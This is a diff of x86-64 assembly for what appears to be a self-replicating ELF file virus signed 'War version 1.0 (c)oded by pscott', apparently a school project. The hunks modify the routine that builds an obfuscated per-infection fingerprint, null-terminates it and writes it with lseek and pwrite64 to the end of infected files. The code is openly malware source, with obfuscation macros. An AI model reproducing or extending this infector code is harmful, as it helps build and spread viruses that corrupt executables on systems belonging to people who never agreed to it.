@@ -664,9 +664,9 @@ _start:
       lea rsi, [rbp + fingerprint + rax] ; load fingerprint address in rsi
       add rsi, r12 ; adjust pointer
 
-      mov eax, [r15 + FINGERPRINT_ADD] ; load how much we should increment
-      inc eax
-      mov [r15 + FINGERPRINT_ADD], eax ; store it back
+      mov al, [r15 + FINGERPRINT_ADD] ; load how much we should increment
+      inc al
+      mov [r15 + FINGERPRINT_ADD], al ; store it back
       mov rax, [rsi] ; load fingerprint
       .byte_from_str: ; load
         OBF3
@@ -711,7 +711,7 @@ _start:
 
       .add: ; add the fingerprint offset to rdx
         xor rax, rax
-        mov eax, [r15 + FINGERPRINT_ADD]
+        mov al, [r15 + FINGERPRINT_ADD]
         add rdx, rax
 
       .byte_to_str: ; number is in rdx
@@ -722,7 +722,7 @@ _start:
         shr r8, 7 ; 1 0 0 0 0 0 0
         and dl, 127 ; 0 1 1 1 1 1 1
         add r8, 0x30 
-        shl r8, 56 ; 0x30 0 0 0 0 0 0 0
+        shl r8, 56
         add rax, r8
 
         xor r8, r8
@@ -778,7 +778,7 @@ _start:
         add r8, 0x30
         add rax, r8
 
-      OBF3
+      ; OBF3
       ; write fingerprint
       mov [r15 + FINGERPRINT], rax ; store fingerprint
 
@@ -789,9 +789,10 @@ _start:
       mov rax, SYS_LSEEK
       syscall
 
+      mov byte [r15 + FINGERPRINT_END], 0
       lea rsi, [r15 + FINGERPRINT] ; load address
       mov r10, rax ; load EOF in rax
-      mov rdx, 8 ; want to write 8 bytes
+      mov rdx, 9 ; 8 bytes + \0
       mov rax, SYS_PWRITE64
       syscall
 
@@ -873,7 +874,7 @@ signature:
   db 0, 'War version 1.0 (c)oded by pscott - '
   signature_len equ $ - signature
 fingerprint:
-	db 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30
+	db 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x00
 key:
   db 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0
 
